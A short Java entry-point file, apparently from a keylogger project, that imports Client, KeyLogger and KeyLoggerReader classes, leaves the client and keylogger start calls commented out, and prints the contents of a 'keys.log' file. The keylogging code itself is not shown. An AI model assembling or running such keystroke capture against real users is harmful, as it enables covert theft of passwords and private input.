import client.Client;
import client.KeyLogger;
import tools.KeyLoggerReader;

public class MainClient {

	public static void main(String[] args) {
		//Client client = new Client();
		//client.start();
		// new KeyLogger().start();
		KeyLoggerReader reader = new KeyLoggerReader("keys.log");
		reader.print();
	}

}
